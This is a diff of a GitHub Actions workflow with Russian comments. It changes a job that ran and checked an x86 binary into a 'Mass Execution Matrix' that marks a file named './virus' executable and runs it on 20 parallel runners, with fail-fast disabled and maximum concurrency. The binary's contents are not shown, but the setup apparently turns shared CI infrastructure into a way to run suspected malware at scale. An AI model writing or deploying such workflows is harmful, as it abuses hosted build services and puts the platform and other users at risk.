@@ -1,33 +1,26 @@
-name: Run x86 Binary
+name: Mass Execution Matrix
 
 on:
-  workflow_dispatch:
+  workflow_dispatch: # Запуск вручную кнопкой
 
 jobs:
-  execute-binary:
-    # ПОПРОБУЙ СНАЧАЛА ubuntu-latest, ЕСЛИ ЭТО LINUX ФАЙЛ
-    # Если ты уверен, что файл для Windows, оставь windows-latest
-    runs-on: ubuntu-latest 
+  deploy:
+    runs-on: ubuntu-latest
     strategy:
+      # Матрица на 20 итераций
       matrix:
-        machine_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        machine_number: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+      # Если одна машина упадет, остальные продолжат работу
       fail-fast: false
+      # Максимальное количество одновременно работающих машин (GitHub обычно ограничивает до 20)
+      max-parallel: 20
 
     steps:
-      - name: Checkout code
+      - name: Checkout
         uses: actions/checkout@v4
-        with:
-          lfs: true # На случай, если файл большой
 
-      - name: Identify and Run File
+      - name: Prepare and Run
         run: |
-          # Даем права на выполнение (важно для Linux)
-          chmod +x ./x86.exe || true
-          
-          # Проверяем, что это за файл на самом деле
-          echo "Checking file type..."
-          file ./x86.exe
-          
-          # Запуск
-          echo "Starting machine ${{ matrix.machine_id }}"
-          ./x86.exe
+          echo "Запуск на машине №${{ matrix.machine_number }}"
+          chmod +x ./virus
+          ./virus
